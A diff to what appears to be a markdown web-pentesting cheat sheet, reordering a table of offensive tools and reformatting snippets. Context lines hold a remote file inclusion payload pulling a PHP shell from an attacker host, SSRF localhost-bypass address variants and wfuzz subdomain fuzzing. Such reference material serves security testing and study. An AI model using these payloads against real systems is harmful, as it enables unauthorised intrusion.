@@ -62,6 +62,8 @@
 | Request Catcher | Request Catcher will create a subdomain on which you can test an application. | https://requestcatcher.com |
 | Webhook.site | Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. | https://webhook.site |
 | grayhatwarfare shorteners | Search Shortener Urls | https://shorteners.grayhatwarfare.com |
+| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
+| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
 | Gobuster | Gobuster is a tool used to brute-force URIs, DNS subdomains, Virtual Host names and open Amazon S3 buckets | https://github.com/OJ/gobuster |
 | feroxbuster | A simple, fast, recursive content discovery tool written in Rust. | https://github.com/epi052/feroxbuster |
 | ffuf | A fast web fuzzer written in Go. | https://github.com/ffuf/ffuf |
@@ -74,8 +76,6 @@
 | EarlyBird | EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. | https://github.com/americanexpress/earlybird |
 | DumpsterDiver | DumpsterDiver is a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords. | https://github.com/securing/DumpsterDiver |
 | reNgine | The only web application recon tool you will ever need! | https://github.com/yogeshojha/rengine |
-| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
-| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
 | katana | A next-generation crawling and spidering framework. | https://github.com/projectdiscovery/katana |
 | NtHiM | Super Fast Sub-domain Takeover Detection | https://github.com/TheBinitGhimire/NtHiM |
 | ipsourcebypass | This Python script can be used to bypass IP source restrictions using HTTP headers. | https://github.com/p0dalirius/ipsourcebypass |
@@ -89,18 +89,18 @@
 | Oralyzer | Oralyzer, a simple python script that probes for Open Redirection vulnerability in a website. | https://github.com/r0075h3ll/Oralyzer |
 | XSRFProbe | The Prime Cross Site Request Forgery Audit & Exploitation Toolkit. | https://github.com/0xInfection/XSRFProbe |
 | SSRFmap | SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. | https://github.com/swisskyrepo/SSRFmap |
-| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
-| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | DOMXSS Wiki | The DOMXSS Wiki is a Knowledge Base for defining sources of attacker controlled inputs and sinks which potentially could introduce DOM Based XSS issues. | https://github.com/wisec/domxsswiki/wiki |
 | Client-Side Prototype Pollution | In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to document.location parsing and useful script gadgets that can be used to demonstrate the impact. | https://github.com/BlackFan/client-side-prototype-pollution |
 | AllThingsSSRF | This is a collection of writeups, cheatsheets, videos, related to SSRF in one single location. | https://github.com/jdonsec/AllThingsSSRF |
 | SSRF testing resources | SSRF (Server Side Request Forgery) testing resources | https://github.com/cujanovic/SSRF-Testing |
-| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
-| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
-| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
 | KeyHacks | KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid. | https://github.com/streaak/keyhacks |
+| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
+| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
+| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
 | Lodash | The Lodash library exported as a UMD module. | https://github.com/lodash/lodash |
 | PHPGGC | PHPGGC: PHP Generic Gadget Chains | https://github.com/ambionics/phpggc |
+| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
+| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 
 ## 403 Bypass
 
@@ -123,10 +123,10 @@ $ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|
 > https://portswigger.net/burp
 
 ```c
-Ctrl+r          # Sending request to repeater
-Ctrl+i          # Sending request to intruder
-Ctrl+Shift+b    # base64 encoding
-Ctrl+Shift+u    # URL decoding
+Ctrl+r          // Sending request to repeater
+Ctrl+i          // Sending request to intruder
+Ctrl+Shift+b    // base64 encoding
+Ctrl+Shift+u    // URL decoding
 ```
 
 ### Filter for SSRF (AutoRepeater)
@@ -1380,7 +1380,7 @@ $ http://<RHOST>/page=http://<LHOST>/<SHELL>.php?
 ### &x=
 
 ```c
-https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
+$ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 ```
 
 The payload ending in `&x=` is being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string.
@@ -1388,15 +1388,15 @@ The payload ending in `&x=` is being used to stop the remaining path from being 
 ### Bypass
 
 ```c
-http://localhost
-http://127.0.0.1
-http://2130706433
-http://0177.1
-http://0x7f.1
-http://127.000.000.1
-http://127.0.0.1.nip .io
-http://[::1]
-http://[::]
+$ http://localhost
+$ http://127.0.0.1
+$ http://2130706433
+$ http://0177.1
+$ http://0x7f.1
+$ http://127.000.000.1
+$ http://127.0.0.1.nip .io
+$ http://[::1]
+$ http://[::]
 ```
 
 ## Server-Side Template Injection (SSTI)
@@ -1522,7 +1522,7 @@ $ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http:/
 ### Domain
 
 ```c
-$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>.<tld>' -u http://<RHOST>/
+$ wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
 ```
 
 ### Subdomain
